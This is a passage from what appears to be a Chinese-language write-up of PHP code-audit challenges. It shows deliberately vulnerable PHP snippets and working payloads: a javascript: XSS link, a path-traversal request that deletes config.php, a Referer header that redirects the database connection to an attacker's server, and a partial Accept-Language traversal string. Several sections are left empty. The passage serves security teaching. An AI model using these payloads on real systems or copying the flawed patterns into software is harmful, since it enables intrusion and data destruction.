class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>test.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> print_r($_FILES);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可看到如下结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> (</span><br><span class="line">    [solution] =&gt; <span class="keyword">Array</span> (</span><br><span class="line">            [name] =&gt; A.png</span><br><span class="line">            [type] =&gt; image/png</span><br><span class="line">            [tmp_name] =&gt; C:\Windows\php4F0F.tmp</span><br><span class="line">            [error] =&gt; <span class="number">0</span></span><br><span class="line">            [size] =&gt; <span class="number">40436</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>结合上面的代码，<code>this-&gt;file</code> 是中间的那个数组，<code>name</code> 是可控的，即我们上传文件本身的名称。</p><p>外面还有一个 <code>if</code> 判断：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array ( mixed $needle , <span class="keyword">array</span> $haystack [, bool $strict = <span class="keyword">FALSE</span> ] ) : bool</span><br></pre></td></tr></table></figure><p>这里其实很好绕过，因为 <code>in_array()</code>  没有开启 <code>strict</code>，将自动转换类型。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1bj55nnsgj20j003qt92.jpg" alt></p><p>可惜了，不能进行目录穿越，在实际场景中可能还要结合一些文件包含才能 <code>getshell</code>了。</p><h2 id="2-Twig"><a href="#2-Twig" class="headerlink" title="2 - Twig"></a>2 - Twig</h2><blockquote><p>filter_var</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// composer require "twig/twig"</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">            <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">            <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide &amp;raquo;&lt;/a&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">        <span class="comment">// index.html file from disk</span></span><br><span class="line">        $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">            <span class="string">'index.html'</span> =&gt; $indexTemplate</span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $nextSlide = $_GET[<span class="string">'nextSlide'</span>];</span><br><span class="line">        <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">            <span class="string">'index.html'</span>,</span><br><span class="line">            [<span class="string">'link'</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><code>twig</code> 是 PHP 的一个模板引擎。接收一个 URL，返回 HTML，极有可能触发 <code>XSS</code>了。</p><p>第一重过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var ( mixed $variable [, int $filter=FILTER_DEFAULT[, mixed $options ]]) :mixed</span><br></pre></td></tr></table></figure><p>题目代码中使用的是 FILTER_VALIDATE_URL 过滤器，它拥有四个可能的标识：</p><ul><li>FILTER_FLAG_SCHEME_REQUIRED - 要求 URL 是 RFC 兼容 URL。（比如：<code>http://example</code>）</li><li>FILTER_FLAG_HOST_REQUIRED - 要求 URL 包含主机名（<code>http://www.example.com</code>）</li><li>FILTER_FLAG_PATH_REQUIRED - 要求 URL 在主机名后存在路径（比如：<code>eg.com/example1/</code>）</li><li>FILTER_FLAG_QUERY_REQUIRED - 要求 URL 存在查询字符串（比如：<code>eg.php?age=37</code>）</li></ul><p>然而这里的过滤非常弱，只验证了 <code>://</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"a://b"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// string(5) "a://b"</span></span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL));</span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_SCHEME_REQUIRED));</span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_HOST_REQUIRED));</span><br><span class="line"></span><br><span class="line"><span class="comment">// bool(false)</span></span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED));</span><br><span class="line">var_dump(filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_QUERY_REQUIRED));</span><br></pre></td></tr></table></figure><p>在手册的评论里面，有人直接给出了利用方法。</p><p><img src="http://ws1.sinaimg.cn/large/de75fd55gy1g325k3p39vj20nt07baak.jpg" alt></p><p>第二重过滤：</p><blockquote><p>Internally, <code>escape</code> uses the PHP native <a href="https://secure.php.net/htmlspecialchars" target="_blank" rel="noopener">htmlspecialchars</a> function for the HTML escaping strategy.</p></blockquote><p>由此可看出，<code>twig</code> 中的 <code>escape</code> 实际是用 <code>htmlspecialchars</code> 实现的。</p><p>将代码简化一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = filter_var($_GET[<span class="string">'url'</span>], FILTER_VALIDATE_URL);</span><br><span class="line">$url = htmlspecialchars($url);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href=$url&gt;Next slide &amp;raquo;&lt;/a&gt;"</span>;</span><br></pre></td></tr></table></figure><h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>到这里思路就比较清晰了，exp 需要包含 <code>://</code> ，<code>&lt;a&gt;</code> 标签可以直接打，不能用单双引号也影响不大。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?nextSlide=javascri<span class="symbol">pt:</span>//<span class="number">233%</span><span class="number">250</span>aalert(<span class="number">1</span>)  // 对 % 编码为 %<span class="number">25</span></span><br><span class="line">=&gt;</span><br><span class="line">&lt;a href=javascri<span class="symbol">pt:</span>//<span class="number">233</span></span><br><span class="line">alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><h2 id="3-Snow-Flake"><a href="#3-Snow-Flake" class="headerlink" title="3 - Snow Flake"></a>3 - Snow Flake</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $template;</span><br><span class="line">    <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><h2 id="4-False-Beard"><a href="#4-False-Beard" class="headerlink" title="4 - False Beard"></a>4 - False Beard</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginViaXml</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            (!strpos($user, <span class="string">'&lt;'</span>) || !strpos($user, <span class="string">'&gt;'</span>)) &amp;&amp;</span><br><span class="line">            (!strpos($pass, <span class="string">'&lt;'</span>) || !strpos($pass, <span class="string">'&gt;'</span>))</span><br><span class="line">        ) &#123;</span><br><span class="line">            $format = <span class="string">'&lt;?xml version="1.0"?&gt;'</span> .</span><br><span class="line">                <span class="string">'&lt;user v="%s"/&gt;&lt;pass v="%s"/&gt;'</span>;</span><br><span class="line">            $xml = sprintf($format, $user, $pass);</span><br><span class="line">            $xmlElement = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">            <span class="comment">// Perform the actual login.</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;login($xmlElement);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Login($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br></pre></td></tr></table></figure><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><h2 id="5-Postcard"><a href="#5-Postcard" class="headerlink" title="5 - Postcard"></a>5 - Postcard</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mailer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> escapeshellarg($email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'to'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'to'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $data[<span class="string">'to'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'to'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'from'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'from'</span>] = <span class="string">'none@ripstech.com'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $data[<span class="string">'from'</span>] = <span class="keyword">$this</span>-&gt;sanitize($data[<span class="string">'from'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'subject'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'subject'</span>] = <span class="string">'No Subject'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($data[<span class="string">'message'</span>])) &#123;</span><br><span class="line">            $data[<span class="string">'message'</span>] = <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mail($data[<span class="string">'to'</span>], $data[<span class="string">'subject'</span>], $data[<span class="string">'message'</span>],</span><br><span class="line">             <span class="string">''</span>, <span class="string">"-f"</span> . $data[<span class="string">'from'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mailer = <span class="keyword">new</span> Mailer();</span><br><span class="line">$mailer-&gt;send($_POST);</span><br></pre></td></tr></table></figure><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><h2 id="6-Frost-Pattern"><a href="#6-Frost-Pattern" class="headerlink" title="6 - Frost Pattern"></a>6 - Frost Pattern</h2><blockquote><p>preg_replace 配置</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TokenStorage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performAction</span><span class="params">($action, $data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($action) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'create'</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;createToken($data);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'delete'</span>:</span><br><span class="line">                <span class="keyword">$this</span>-&gt;clearToken($data);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'Unknown action'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createToken</span><span class="params">($seed)</span> </span>&#123;</span><br><span class="line">        $token = md5($seed);</span><br><span class="line">        file_put_contents(<span class="string">'/tmp/tokens/'</span> . $token, <span class="string">'...data'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearToken</span><span class="params">($token)</span> </span>&#123;</span><br><span class="line">        $file = preg_replace(<span class="string">"/[^a-z.-_]/"</span>, <span class="string">""</span>, $token);</span><br><span class="line">        unlink(<span class="string">'/tmp/tokens/'</span> . $file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$storage = <span class="keyword">new</span> TokenStorage();</span><br><span class="line">$storage-&gt;performAction($_GET[<span class="string">'action'</span>], $_GET[<span class="string">'data'</span>]);</span><br></pre></td></tr></table></figure><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>本题实现的功能就两个，写文件、删除文件。</p><p><code>createToken()</code> 唯一可控的就是 <code>seed</code> ，然而文件名还被完全限死，内容也不可控。</p><p><code>clearToken()</code> 有一个正则匹配的过滤，不过<code>/[^a-z.-_]/</code> 这里配置有点问题。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1f65tmt8vj20jd02l0sz.jpg" alt></p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><p>任意文件删除漏洞</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=<span class="keyword">delete</span>&amp;data=../../<span class="built_in">config</span>.php</span><br></pre></td></tr></table></figure><h2 id="7-Bells"><a href="#7-Bells" class="headerlink" title="7 - Bells"></a>7 - Bells</h2><blockquote><p>parse_str</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span><span class="params">($id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $config, $db;</span><br><span class="line">    <span class="keyword">if</span> (!is_resource($db)) &#123;</span><br><span class="line">        $db = <span class="keyword">new</span> MySQLi(</span><br><span class="line">            $config[<span class="string">'dbhost'</span>],</span><br><span class="line">            $config[<span class="string">'dbuser'</span>],</span><br><span class="line">            $config[<span class="string">'dbpass'</span>],</span><br><span class="line">            $config[<span class="string">'dbname'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = <span class="string">"SELECT username FROM users WHERE id = ?"</span>;</span><br><span class="line">    $stmt = $db-&gt;prepare($sql);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">'i'</span>, $id);</span><br><span class="line">    $stmt-&gt;bind_result($name);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;fetch();</span><br><span class="line">    <span class="keyword">return</span> $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$var = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">parse_str($var[<span class="string">'query'</span>]);</span><br><span class="line">$currentUser = getUser($id);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;'</span>.htmlspecialchars($currentUser).<span class="string">'&lt;/h1&gt;'</span>;</span><br></pre></td></tr></table></figure><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p><code>parse_str()</code> 极其容易导致变量覆盖漏洞，</p><p>另外<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code> 是可控的，改下 <code>Referer</code> 头即可。</p><blockquote><p>要获取当前的 <em>QUERY_STRING</em>，可以使用 <a href="https://php.net/manual/zh/reserved.variables.server.php" target="_blank" rel="noopener">$_SERVER[‘QUERY_STRING’]</a> 变量。 </p></blockquote><p>注意到第二行 <code>global $config, $db</code>，可以覆盖掉它，从而接入我们的数据库。</p><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><p>修改 <code>Referer</code> 头</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://host/?config</span>[<span class="string">dbhost</span>]=vps<span class="emphasis">_ip&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=attack&amp;id=1</span></span><br></pre></td></tr></table></figure><h2 id="8-Candle"><a href="#8-Candle" class="headerlink" title="8 - Candle"></a>8 - Candle</h2><blockquote><p>preg_replace /e</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span><span class="params">($regex, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $regex . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $value</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $regex =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complexStrtolower($regex, $value) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>preg_replace()</code> 的 <code>e</code> 模式可以 RCE</p><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><h2 id="9-Rabbit"><a href="#9-Rabbit" class="headerlink" title="9 - Rabbit"></a>9 - Rabbit</h2><blockquote><p>str_replace</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LanguageManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadLanguage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $lang = <span class="keyword">$this</span>-&gt;getBrowserLanguage();</span><br><span class="line">        $sanitizedLang = <span class="keyword">$this</span>-&gt;sanitizeLanguage($lang);</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="string">"/lang/$sanitizedLang"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getBrowserLanguage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $lang = $_SERVER[<span class="string">'HTTP_ACCEPT_LANGUAGE'</span>] ?? <span class="string">'en'</span>;</span><br><span class="line">        <span class="keyword">return</span> $lang;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeLanguage</span><span class="params">($language)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $language);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> LanguageManager())-&gt;loadLanguage();</span><br></pre></td></tr></table></figure><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>$_SERVER[‘HTTP_ACCEPT_LANGUAGE’]` 是可控的，可以尝试文件包含。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1f3gicodej20t207dab2.jpg" alt></p><p>这里的过滤太弱了，只是简单的替换一下，可将 <code>\/</code> 都删掉。</p><blockquote><p>如果没有一些特殊的替换需求（比如正则表达式），你应该使用该函数替换 <a href="https://php.net/manual/zh/function.ereg-replace.php" target="_blank" rel="noopener">ereg_replace()</a> 和 <a href="https://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">preg_replace()</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(str_replace(<span class="string">"../"</span>,<span class="string">""</span>,<span class="string">"....//"</span>));</span><br><span class="line"><span class="comment">// ../</span></span><br></pre></td></tr></table></figure><h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Language: .<span class="regexp">//</span>....<span 